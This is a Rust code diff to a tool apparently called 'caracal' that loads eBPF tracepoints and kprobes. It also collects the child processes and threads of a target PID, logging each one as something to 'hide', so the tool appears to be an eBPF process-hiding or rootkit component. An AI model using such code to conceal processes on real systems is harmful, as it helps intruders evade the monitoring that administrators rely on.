@@ -3,11 +3,13 @@ use std::{collections::HashSet, fs::OpenOptions, io::Write, path::Path};
 use anyhow::{anyhow, Error};
 use aya::{
     maps::loaded_maps,
-    programs::{loaded_programs, ProgramInfo, TracePoint},
+    programs::{
+        loaded_programs, uprobe::UProbeAttachLocation, KProbe, ProgramInfo, TracePoint, UProbe,
+    },
     Ebpf, Pod,
 };
 use caracal_common::MAX_PID_LENGTH;
-use log::debug;
+use log::{debug, info, warn};
 use sysinfo::{Pid, Process, System};
 #[inline]
 pub fn list_active_programs() -> Vec<u32> {
@@ -36,12 +38,27 @@ pub fn write_to_tracefs(message: &str, path: &str) -> std::io::Result<()> {
 pub struct Builder<'a> {
     pub ebpf: &'a mut Ebpf,
     pub tracepoints: Vec<SyscallTracepoint>,
+    pub kprobes: Vec<Kprobe>,
 }
+
+pub struct Kprobe {
+    pub func_name: String,
+    pub kfunc_name: String,
+}
+
+impl From<(&str, &str)> for Kprobe {
+    fn from(v: (&str, &str)) -> Self {
+        Self {
+            func_name: v.0.into(),
+            kfunc_name: v.1.into(),
+        }
+    }
+}
+
 pub struct SyscallTracepoint {
     pub func_name: String,
     pub syscall_name: String,
 }
-
 impl From<(&str, &str)> for SyscallTracepoint {
     fn from(v: (&str, &str)) -> Self {
         Self {
@@ -64,6 +81,18 @@ impl Builder<'_> {
 
             program.load()?;
             program.attach("syscalls", &tp.syscall_name)?;
+            programs_info.push(program.info()?)
+        }
+        for kprobe in &self.kprobes {
+            let fname = &kprobe.func_name;
+            let program: &mut KProbe = self
+                .ebpf
+                .program_mut(fname)
+                .ok_or_else(|| anyhow!("program '{fname}' not found"))?
+                .try_into()?;
+
+            program.load()?;
+            program.attach(kprobe.kfunc_name.clone(), 0)?;
             programs_info.push(program.info()?)
         }
         Ok(programs_info)
@@ -124,32 +153,53 @@ pub fn get_progs_info_from_progs_ids(prog_ids: Vec<u32>) -> Vec<ProgramInfo> {
     prog_info
 }
 
-pub fn list_threads(proc: &Process) -> Vec<Pid> {
+pub fn list_threads(proc: &Process, sys: &System) -> Vec<Pid> {
     let mut threads: Vec<Pid> = vec![];
     if let Some(tasks) = proc.tasks() {
         for pid in tasks {
+            if let Some(task) = sys.process(*pid) {
+                info!(
+                    "  ({}) -> hide child thread ({pid}) [{:?}]",
+                    proc.pid(),
+                    task.name()
+                );
+            } else {
+                info!("  ({}) -> hide child thread ({pid})", proc.pid());
+            }
             threads.push(*pid)
         }
     }
     threads
 }
-pub fn get_descendants(sys: &System, pid: Pid) -> Vec<Pid> {
-    let mut descendants = Vec::new();
+pub fn get_descendants(sys: &System, pid: Pid) -> (Vec<Pid>, Vec<Pid>) {
+    let mut descendants_pid: Vec<Pid> = Vec::new();
     let mut queue: Vec<Pid> = vec![pid];
 
     let mut threads: Vec<Pid> = vec![];
     while let Some(current) = queue.pop() {
         if let Some(proc) = sys.process(current) {
-            threads.extend(list_threads(proc))
-        };
+            threads.extend(list_threads(proc, &sys))
+        } else {
+            warn!("pid {} not found", current)
+        }
 
         for (child_pid, proc) in sys.processes() {
-            if proc.parent() == Some(current) && !threads.contains(&proc.pid()) {
-                descendants.push(*child_pid);
+            if proc.parent() == Some(current) {
+                if !threads.contains(&proc.pid()) {
+                    descendants_pid.push(*child_pid);
+                    if let Some(task) = sys.process(*child_pid) {
+                        info!(
+                            "({current}) -> hide child process ({child_pid}) [{:?}]",
+                            task.name()
+                        );
+                    } else {
+                        info!("({current}) -> hide child process ({child_pid})");
+                    }
+                }
                 queue.push(*child_pid);
             }
         }
     }
 
-    descendants
+    (descendants_pid, threads)
 }
